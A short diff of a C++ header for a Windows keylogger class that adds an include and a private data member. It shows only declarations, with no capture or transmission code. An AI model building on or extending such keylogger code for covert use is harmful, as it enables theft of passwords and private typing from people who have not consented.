@@ -17,9 +17,12 @@
 #include	<map>
 #include	<windows.h>
 #include	"IKeyLogger.hpp"
+#include	"dataStructure.hpp"
 
 class 		WindowsKeyLogger : public IKeyLogger
 {
+private:
+  t_register	*infos;
 public:
 
   ///brief std::map of the key that have a VK_CODE association
